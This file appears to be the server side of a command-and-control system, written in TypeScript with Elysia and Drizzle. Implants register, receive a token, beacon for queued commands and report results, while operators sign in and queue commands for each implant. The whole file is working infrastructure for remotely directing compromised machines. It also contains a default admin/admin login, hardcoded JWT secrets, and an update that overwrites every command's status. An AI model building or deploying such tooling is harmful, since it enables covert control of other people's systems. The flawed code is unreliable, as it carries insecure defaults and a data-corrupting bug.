import { Elysia, t } from 'elysia';
import { jwt } from '@elysiajs/jwt';
import { swagger } from '@elysiajs/swagger';
import { drizzle } from 'drizzle-orm/bun-sqlite';
import * as schema from './db/schema';
import { eq } from 'drizzle-orm';
import { createInsertSchema } from 'drizzle-typebox';

const usersInsertSchema = createInsertSchema(schema.users);
const commandsInsertSchema = createInsertSchema(schema.commands);

const db = drizzle(process.env.DB_FILE_NAME!, { schema });

const app = new Elysia()
  .onStart(async () => {
    await db
      .insert(schema.users)
      .values({ username: 'admin', password: await Bun.password.hash('admin') })
      .onConflictDoNothing({ target: schema.users.username });
  })
  .use(swagger())
  .use(
    jwt({
      name: 'implantJWT',
      secret: 'implent JWT secret',
      schema: t.Object({ id: t.Number() }),
    }),
  )
  .use(
    jwt({
      name: 'clientJWT',
      secret: 'client JWT secret',
      schema: t.Object({ username: t.String() }),
    }),
  )
  .macro(({ onBeforeHandle }) => ({
    isSignIn(enabled: boolean) {
      if (!enabled) return;

      onBeforeHandle(
        async ({ headers: { authorization }, error, clientJWT }) => {
          if (!authorization) {
            return error(401, { success: false, message: 'Unauthorized' });
          }

          const payload = await clientJWT.verify(authorization);
          if (payload == false) {
            return error(401, { success: false, message: 'Unauthorized' });
          }
        },
      );
    },
  }))
  .post(
    '/auth/signin',
    async ({ body: { username, password }, error, clientJWT }) => {
      const user = await db.query.users.findFirst({
        where: (users, { eq }) => eq(users.username, username),
      });

      if (!user || !(await Bun.password.verify(password, user.password))) {
        return error(401, { success: false, message: 'Invalid credentials' });
      }

      const token = await clientJWT.sign({
        username,
      });

      return {
        success: true,
        message: 'Signin successful',
        token,
      };
    },
    {
      body: t.Pick(usersInsertSchema, ['username', 'password']),
    },
  )
  .get(
    '/implants',
    async () => {
      const implants = await db.query.implants.findMany();
      return implants;
    },
    {
      isSignIn: true,
    },
  )
  .get(
    '/implants/:id',
    async ({ error, params: { id } }) => {
      const implant = await db.query.implants.findFirst({
        where: (implants, { eq }) => eq(implants.id, id),
      });

      if (!implant) {
        return error(404, { success: false, message: 'Implant not found' });
      }
      return {
        success: true,
        message: 'Implant found',
        implant,
      };
    },
    { params: t.Object({ id: t.Number() }), isSignIn: true },
  )
  .post('/implants', async ({ implantJWT }) => {
    const implant = (
      await db.insert(schema.implants).values({}).returning()
    )[0];

    const token = await implantJWT.sign({ id: implant.id });

    return {
      success: true,
      message: 'Implant created',
      token,
      implant,
    };
  })
  .get(
    '/implants/beacon',
    async ({ implantJWT, headers: { authorization }, error }) => {
      const jwtPayload = await implantJWT.verify(authorization);

      if (jwtPayload == false) {
        return error(401, { success: false, message: 'Unauthorized' });
      }

      const implantId = jwtPayload.id;
      const implant = await db.query.implants.findFirst({
        where: (implants, { eq }) => eq(implants.id, implantId),
        with: {
          commands: {
            where: (commands, { eq }) => eq(commands.status, 'Queued'),
            orderBy: (commands, { asc }) => [asc(commands.createdAt)],
          },
        },
      });
      if (!implant) {
        return error(404, { success: false, message: 'Implant not found' });
      }

      await db
        .update(schema.implants)
        .set({
          lastSeenAt: new Date(),
        })
        .where(eq(schema.implants.id, implant.id));

      return {
        success: true,
        message: 'Implant updated',
        implant,
      };
    },
    {
      headers: t.Object({ authorization: t.String() }),
    },
  )
  .get(
    '/commands',
    async () => {
      const commands = await db.query.commands.findMany();
      return commands;
    },
    {
      isSignIn: true,
    },
  )
  .get(
    '/commands/:id',
    async ({ params: { id }, error }) => {
      const command = await db.query.commands.findFirst({
        where: (commands, { eq }) => eq(commands.id, id),
      });

      if (!command) {
        return error(404, { success: false, message: 'Implant not found' });
      }
      return {
        success: true,
        message: 'Command found',
        command,
      };
    },
    {
      params: t.Object({
        id: t.Number(),
      }),
      isSignIn: true,
    },
  )
  .post(
    '/commands',
    async ({ error, body: { implantId, type, payload } }) => {
      const implant = await db.query.implants.findFirst({
        where: (implants, { eq }) => eq(implants.id, implantId),
      });
      if (!implant) {
        return error(404, { success: false, message: 'Implant not found' });
      }

      const command = (
        await db
          .insert(schema.commands)
          .values({
            implantId,
            type,
            payload,
          })
          .returning()
      )[0];

      return {
        success: true,
        message: 'Command created',
        command,
      };
    },
    {
      body: t.Pick(commandsInsertSchema, ['implantId', 'type', 'payload']),
      isSignIn: true,
    },
  )
  .post(
    '/commands/:id/status',
    async ({
      params: { id: commandId },
      headers: { authorization },
      body: { status, response },
      implantJWT,
      error,
    }) => {
      const jwtPayload = await implantJWT.verify(authorization);

      if (jwtPayload == false) {
        return error(401, { success: false, message: 'Unauthorized' });
      }

      const implantId = jwtPayload.id;
      const implant = await db.query.implants.findFirst({
        where: (implants, { eq }) => eq(implants.id, implantId),
      });
      if (!implant) {
        return error(404, { success: false, message: 'Implant not found' });
      }

      const command = await db.query.commands.findFirst({
        where: (commands, { and, eq }) =>
          and(eq(commands.id, commandId), eq(commands.implantId, implantId)),
      });
      if (!command) {
        return error(404, { success: false, message: 'Command not found' });
      }

      const updated_command = (
        await db
          .update(schema.commands)
          .set({
            status: status,
            response,
          })
          .returning()
      )[0];

      return {
        success: true,
        message: 'Command updated',
        command: updated_command,
      };
    },
    {
      params: t.Object({ id: t.Number() }),
      headers: t.Object({ authorization: t.String() }),
      body: t.Pick(commandsInsertSchema, ['status', 'response']),
    },
  )
  .listen(3000);

console.log(
  `🦊 Elysia is running at ${app.server?.hostname}:${app.server?.port}`,
);
